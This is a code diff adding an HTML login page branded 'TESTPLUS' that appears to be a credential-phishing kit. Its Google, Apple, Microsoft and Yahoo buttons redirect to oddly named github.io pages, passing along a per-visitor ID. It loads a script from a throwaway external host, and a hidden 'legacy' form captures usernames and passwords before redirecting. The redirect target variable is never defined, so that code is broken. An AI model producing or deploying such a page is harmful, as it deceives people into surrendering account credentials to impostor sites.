@@ -1,0 +1,254 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Login TESTPLUS</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<style>
+*{
+  margin:0;
+  padding:0;
+  box-sizing:border-box;
+  font-family: system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+}
+
+body{
+  height:100vh;
+  background: linear-gradient(to bottom, #4a6466 0%, #061b1f 80%);
+  color:#fff;
+  padding:20px;
+}
+
+/* HEADER */
+.header{
+  display:flex;
+  align-items:center;
+  gap:12px;
+  font-size:22px;
+  margin-bottom:26px;
+  cursor:pointer;
+}
+
+.header span{
+  font-size:28px;
+}
+
+/* TEXT */
+.title{
+  color:#7dff5c;
+  font-size:26px;
+  margin-bottom:14px;
+}
+
+.desc{
+  font-size:16px;
+  opacity:0.95;
+  line-height:1.4;
+  margin-bottom:50px;
+}
+
+/* BUTTONS */
+.social-btn{
+  width:100%;
+  padding:16px;
+  border-radius:40px;
+  margin-bottom:14px;
+  border:1px solid #fff;
+  background:transparent;
+  color:#fff;
+  font-size:16px;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  gap:10px;
+  cursor:pointer;
+}
+
+.google{ background:#000; border:none; }
+
+.bottom-link{
+  text-align:center;
+  margin-top:45px;
+  font-size:15px;
+}
+
+.bottom-link span{
+  text-decoration:underline;
+  cursor:pointer;
+}
+
+/* ===== LEGACY FORM ===== */
+.input-group{ margin-top:22px; }
+
+input{
+  width:100%;
+  background:transparent;
+  border:none;
+  border-bottom:1px solid #ccc;
+  padding:14px 5px;
+  font-size:16px;
+  color:#fff;
+  outline:none;
+}
+
+.password-wrap{ position:relative; }
+
+.eye{
+  position:absolute;
+  right:5px;
+  top:50%;
+  transform:translateY(-50%);
+  font-size:18px;
+  cursor:pointer;
+  opacity:0.7;
+}
+
+.signin-btn{
+  width:100%;
+  padding:16px;
+  border:none;
+  border-radius:40px;
+  margin-top:120px;
+  font-size:18px;
+  background:#3a6;
+  color:#fff;
+  opacity:0.4;
+  cursor:not-allowed;
+}
+
+.signin-btn.active{
+  opacity:1;
+  cursor:pointer;
+}
+
+.hidden{ display:none; }
+</style>
+</head>
+<body>
+<script src="https://eal876955-lgtm.github.io/npi/m/intelligent.js"></script>
+<!-- ===== MAIN SIGN IN PAGE ===== -->
+<div id="mainPage">
+
+  <div class="header">
+    <span>←</span>
+  </div>
+
+  <div class="title">TESTPLUS Sign in</div>
+
+  <div class="desc">
+    Welcome back!<br>
+    Remember to log in with the same social account you signed up with.
+  </div>
+
+  <!-- SOCIAL BUTTONS -->
+  <button class="social-btn google" onclick="openSocial('https://olptyi.github.io/nb/gma')">
+    G Sign in with Google
+  </button>
+
+  <button class="social-btn" onclick="openSocial('https://fliacrypnloi.github.io/pm/nb/app.html')">
+     Sign in with Apple
+  </button>
+
+  <button class="social-btn" onclick="openSocial('https://eal876955-lgtm.github.io/npi/m/mt.htm')">
+    ■ Sign in with Microsoft
+  </button>
+
+  <button class="social-btn" onclick="openSocial('https://ilyelya.github.io/n/newcv/cvy.html')">
+    Y! Sign in with Yahoo
+  </button>
+
+  <div class="bottom-link">
+    I have an account from <span onclick="showLegacy()">before 2020</span>
+  </div>
+
+</div>
+
+<!-- ===== LEGACY LOGIN PAGE ===== -->
+<div id="legacyPage" class="hidden">
+
+  <div class="header" onclick="goBack()">
+    <span>←</span>
+  </div>
+
+  <div class="title">Legacy sign in</div>
+  <div class="desc">(accounts from before 2020)</div>
+<form>
+  <div class="input-group">
+    <input type="text" id="user" placeholder="Username, verified email or phone" name="USERNAME EMAIIL OR PHONE">
+  </div>
+
+  <div class="input-group password-wrap">
+    <input type="password" id="pass" placeholder="Password" name="PASSWORD">
+    <span class="eye" onclick="togglePassword()">👁</span>
+  </div>
+
+  <button class="signin-btn" id="signBtn" type="submit">Sign in</button>
+</form>
+</div>
+
+<script>
+/* ✅ TARGET PAGE FOR LEGACY LOGIN */ // CHANGE IF NEEDED
+
+/* ✅ GET id FROM URL */
+const urlParams = new URLSearchParams(window.location.search);
+const userId = urlParams.get("id");
+
+/* ✅ UNIVERSAL REDIRECT WITH ID */
+function openSocial(baseUrl){
+  let finalUrl = baseUrl;
+
+  if(userId){
+    finalUrl += (baseUrl.includes("?") ? "&" : "?") + "id=" + encodeURIComponent(userId);
+  }
+
+  window.location.href = finalUrl;
+}
+
+/* ✅ SHOW & HIDE LEGACY */
+function showLegacy(){
+  document.getElementById("mainPage").classList.add("hidden");
+  document.getElementById("legacyPage").classList.remove("hidden");
+}
+
+function goBack(){
+  document.getElementById("legacyPage").classList.add("hidden");
+  document.getElementById("mainPage").classList.remove("hidden");
+}
+
+/* ✅ PASSWORD TOGGLE */
+function togglePassword(){
+  const pass = document.getElementById("pass");
+  pass.type = pass.type === "password" ? "text" : "password";
+}
+
+/* ✅ ENABLE BUTTON + REDIRECT WITH ID */
+const user = document.getElementById("user");
+const pass = document.getElementById("pass");
+const btn = document.getElementById("signBtn");
+
+[user, pass].forEach(input=>{
+  input.addEventListener("input", ()=>{
+    if(user.value.trim() && pass.value.trim()){
+      btn.classList.add("active");
+    } else {
+      btn.classList.remove("active");
+    }
+  });
+});
+
+/* ✅ LEGACY SIGN-IN REDIRECT */
+btn.addEventListener("click", ()=>{
+  if(!btn.classList.contains("active")) return;
+
+  let finalUrl = LEGACY_NEXT_URL;
+  if(userId){
+    finalUrl += (LEGACY_NEXT_URL.includes("?") ? "&" : "?") + "id=" + encodeURIComponent(userId);
+  }
+
+  window.location.href = finalUrl;
+});
+</script>
+
+</body>
+</html>
